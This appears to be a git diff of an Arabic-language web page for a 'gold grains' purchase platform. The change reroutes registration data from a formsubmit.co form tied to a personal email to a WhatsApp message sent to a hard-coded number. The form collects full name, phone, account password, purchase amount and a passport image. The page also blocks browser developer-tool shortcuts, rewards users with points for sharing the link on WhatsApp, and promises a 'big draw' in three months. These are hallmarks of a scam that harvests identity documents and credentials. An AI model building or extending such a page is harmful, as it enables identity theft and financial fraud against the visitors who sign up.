@@ -208,7 +208,7 @@
         .bank-details {
             background: linear-gradient(145deg, #1c1c1c, #121212);
             border: 1px solid var(--gold-dark);
-            border-radius: 16px;
+            border-radius: 18px;
             padding: 18px;
             margin: 15px 0;
             text-align: right;
@@ -303,28 +303,25 @@
                     </div>
                 </div>
 
-                <form id="registerForm" action="https://formsubmit.co/mohammedata009@gmail.com" method="POST" enctype="multipart/form-data">
-                    <input type="hidden" name="_captcha" value="false">
-                    <input type="hidden" name="_subject" value="طلب توثيق جديد - حبوب الذهب">
-
+                <form id="registerForm" onsubmit="handleRegister(event)">
                     <div class="form-group">
                         <label>الاسم بالكامل:</label>
-                        <input type="text" id="regName" name="الاسم" placeholder="أدخل اسمك الثلاثي" required autocomplete="off">
+                        <input type="text" id="regName" placeholder="أدخل اسمك الثلاثي" required autocomplete="off">
                     </div>
 
                     <div class="form-group">
-                        <label>رقم الهاتف / العملية (اسم المستخدم):</label>
-                        <input type="tel" id="regPhone" name="رقم_الهاتف" placeholder="أدخل رقم الهاتف" required autocomplete="off">
+                        <label>رقم الهاتف / رقم العملية (اسم المستخدم):</label>
+                        <input type="tel" id="regPhone" placeholder="أدخل رقم الهاتف" required autocomplete="off">
                     </div>
 
                     <div class="form-group">
                         <label>إنشاء كلمة سر للحساب:</label>
-                        <input type="password" id="regPass" name="كلمة_السر" placeholder="أدخل كلمة سر خاصة بك" required autocomplete="off">
+                        <input type="password" id="regPass" placeholder="أدخل كلمة سر خاصة بك" required autocomplete="off">
                     </div>
 
                     <div class="form-group">
                         <label>الكمية المطلوبة (بالجرام):</label>
-                        <input type="number" id="quantity" name="الكمية_بالجرام" min="0.1" step="0.1" placeholder="مثال: 1" required oninput="calculateTotal()">
+                        <input type="number" id="quantity" min="0.1" step="0.1" placeholder="مثال: 1" required oninput="calculateTotal()">
                     </div>
 
                     <div class="form-group">
@@ -336,11 +333,11 @@
                         <label>صورة الجواز للتوثيق:</label>
                         <div class="file-input-wrapper">
                             <span id="fileNameDisplay">📷 اضغط لرفع صورة الجواز</span>
-                            <input type="file" name="صورة_الجواز" accept="image/*,.pdf" required onchange="updateFileName(this)">
+                            <input type="file" id="passportFile" accept="image/*,.pdf" required onchange="updateFileName(this)">
                         </div>
                     </div>
 
-                    <button type="submit" class="btn-submit">إرسال التوثيق وإنشاء الحساب</button>
+                    <button type="submit" class="btn-submit">إرسال التوثيق عبر الواتساب</button>
                 </form>
 
                 <div class="nav-links">
@@ -375,7 +372,7 @@
                 </div>
             </div>
 
-            <!-- 3. الصفحة الشخصية للمستخدم (Dashboard) مع نظام مشاركة رابط الصفحة والسحب بعد 3 أشهر -->
+            <!-- 3. الصفحة الشخصية للمستخدم (Dashboard) -->
             <div id="step-dashboard" class="dashboard-card">
                 <div class="header">
                     <div class="gold-icon">✨</div>
@@ -415,6 +412,9 @@
     </div>
 
     <script>
+        // استبدل هذا الرقم برقم هاتفك بصيغة دولية بدون علامة + (مثال: 249912345678)
+        const myWhatsAppNumber = "249912345678";
+
         document.onkeydown = function(e) {
             if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) {
                 return false;
@@ -466,7 +466,6 @@
             alert("شكراً لمشاركتك! تمت إضافة 5 نقاط جديدة لرصيدك.");
         }
 
-        // مشاركة رابط الصفحة الفعلي مع رسالة دعوة والسحب بعد 3 أشهر
         function shareToWhatsApp() {
             const pageUrl = window.location.href;
             const text = encodeURIComponent("✨ فرصة ذهبية! ندعوكم للاشتراك في منصة حبوب الذهب الفاخرة، اشترِ بالجرام أو بالحبة. 🏆 ملاحظة هامة: السحب الكبير سيتم بعد 3 أشهر من الآن!\n\nرابط الصفحة للانضمام:");
@@ -480,10 +479,16 @@
             addPoints();
         }
 
-        document.getElementById('registerForm').addEventListener('submit', async function(e) {
+        // إرسال البيانات عبر الواتساب والانتقال للصفحة الشخصية
+        async function handleRegister(e) {
+            e.preventDefault();
             const name = document.getElementById('regName').value;
             const phone = document.getElementById('regPhone').value;
             const pass = document.getElementById('regPass').value;
+            const qty = document.getElementById('quantity').value;
+            const total = document.getElementById('totalAmount').value;
+            const fileInput = document.getElementById('passportFile');
+            const fileName = fileInput.files[0] ? fileInput.files[0].name : "لم يتم إرفاق ملف";
 
             const hashedPhone = await hashText(phone);
             const hashedPass = await hashText(pass);
@@ -493,11 +498,25 @@
             localStorage.setItem('_uN', name);
             localStorage.setItem('_uPts', '10');
 
+            // تجهيز نص رسالة الواتساب لتصلك مباشرة
+            const message = encodeURIComponent(
+                `👑 *طلب توثيق وشراء جديد - حبوب الذهب*\n\n` +
+                `👤 الاسم: ${name}\n` +
+                `📞 رقم الهاتف/العملية: ${phone}\n` +
+                `⚖️ الكمية المطلوبة: ${qty} جرام\n` +
+                `💰 المبلغ الإجمالي: ${total}\n` +
+                `📄 اسم ملف الجواز المرفق: ${fileName}\n\n` +
+                `⚠️ يرجى إرسال صورة الجواز الفعلية هنا عبر الواتساب لتأكيد الحساب.`
+            );
+
+            // فتح الواتساب برقمك والرسالة الجاهزة
+            window.open(`https://api.whatsapp.com/send?phone=${myWhatsAppNumber}&text=${message}`, '_blank');
+
             document.getElementById('userDashboardName').innerText = name;
             document.getElementById('userPoints').innerText = '10';
             document.getElementById('step-register').style.display = 'none';
             document.getElementById('step-dashboard').style.display = 'block';
-        });
+        }
 
         async function handleLogin(e) {
             e.preventDefault();
